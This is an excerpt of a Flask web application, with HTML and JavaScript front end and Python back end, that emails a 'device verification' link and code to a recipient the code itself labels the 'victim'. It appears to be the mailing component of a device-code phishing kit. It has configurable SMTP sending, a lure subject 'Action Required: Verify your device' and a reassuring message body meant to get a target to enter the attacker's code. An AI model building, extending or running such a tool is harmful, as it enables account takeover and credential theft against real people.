...
Includes built‑in email delivery of the verification link/code.
...
Environment variables:
  ...
  - EMAIL_SMTP_HOST, EMAIL_SMTP_PORT, EMAIL_USERNAME, EMAIL_PASSWORD, EMAIL_FROM, EMAIL_SUBJECT (optional SMTP defaults)
    ...
    <div class="card" id="emailCard">
        ...
        <div class="grid-2">
            <div>
                ...
                <input type="text" id="smtpHost" placeholder="smtp.gmail.com" value="{{ email_host or '' }}">
            </div>
            <div>
                <label for="smtpPort">Port</label>
                <input type="number" id="smtpPort" placeholder="587" value="{{ email_port or '587' }}">
            </div>
            <div>
                <label for="smtpUser">SMTP Username</label>
                <input type="text" id="smtpUser" placeholder="sender@gmail.com" value="{{ email_user or '' }}">
            </div>
            <div>
                <label for="smtpPass">SMTP Password</label>
                <input type="password" id="smtpPass" placeholder="App password" value="{{ email_pass or '' }}">
            </div>
            <div>
                <label for="emailFrom">From Address</label>
                <input type="email" id="emailFrom" placeholder="sender@gmail.com" value="{{ email_from or '' }}">
            </div>
            <div>
                <label for="emailTo">To Address (victim)</label>
                <input type="email" id="emailTo" placeholder="victim@example.com">
            </div>
            <div>
                <label for="emailSubject">Subject</label>
                <input type="text" id="emailSubject" placeholder="Verify your device" value="{{ email_subject or 'Action Required' }}">
            </div>
        </div>
        <div class="flex mt-10">
            <button class="btn btn-secondary" id="sendEmailBtn" onclick="sendEmail()" disabled>Send Email</button>
        </div>
    </div>
...
async function sendEmail() {
    ...
    const payload = {
        ...
        from_addr: document.getElementById('emailFrom').value,
        to_addr: document.getElementById('emailTo').value,
        subject: document.getElementById('emailSubject').value,
        verification_uri: document.getElementById('verificationUri').textContent,
        user_code: document.getElementById('userCode').textContent,
    };

    if (!payload.to_addr) {
        addLog('Recipient email address is required', 'err');
        btn.disabled = false;
    ...
    try {
        ...
        if (resp.ok) {
            addLog(`Email sent to ${payload.to_addr}`, 'ok');
        } else {
            addLog(`Email failed: ${data.error || 'Unknown error'}`, 'err');
        }
    } catch (e) {
        addLog(`Email error: ${e.message}`, 'err');
    }
...
def index():
    return render_template_string(
        ...
        email_subject=os.environ.get('EMAIL_SUBJECT', 'Action Required: Verify your device')
    )
...
@requires_auth
def api_send_email():
    """Send the device verification email to the victim."""
    data = request.get_json()
    
    smtp_host = data.get('smtp_host') or os.environ.get('EMAIL_SMTP_HOST')
    smtp_port = data.get('smtp_port') or int(os.environ.get('EMAIL_SMTP_PORT', 587))
    username = data.get('username') or os.environ.get('EMAIL_USERNAME')
    password = data.get('password') or os.environ.get('EMAIL_PASSWORD')
    from_addr = data.get('from_addr') or os.environ.get('EMAIL_FROM')
    to_addr = data.get('to_addr')
    subject = data.get('subject') or os.environ.get('EMAIL_SUBJECT', 'Action Required: Verify your device')
    verification_uri = data.get('verification_uri')
    user_code = data.get('user_code')
    
    if not all([smtp_host, to_addr, verification_uri, user_code]):
        return jsonify({"error": "Missing required fields (SMTP host, recipient, verification_uri, user_code)"}), 400
    if not username or not password:
        return jsonify({"error": "SMTP authentication credentials missing"}), 400
    if not from_addr:
        from_addr = username
    
    body = f"""Please verify your device by visiting the link below and entering the code.

Verification URL: {verification_uri}
Code: {user_code}

This is an automated message. If you did not request this, please ignore.
"""
    ...
    try:
        ...
        logger.info(f"Email sent to {to_addr} via {smtp_host}")
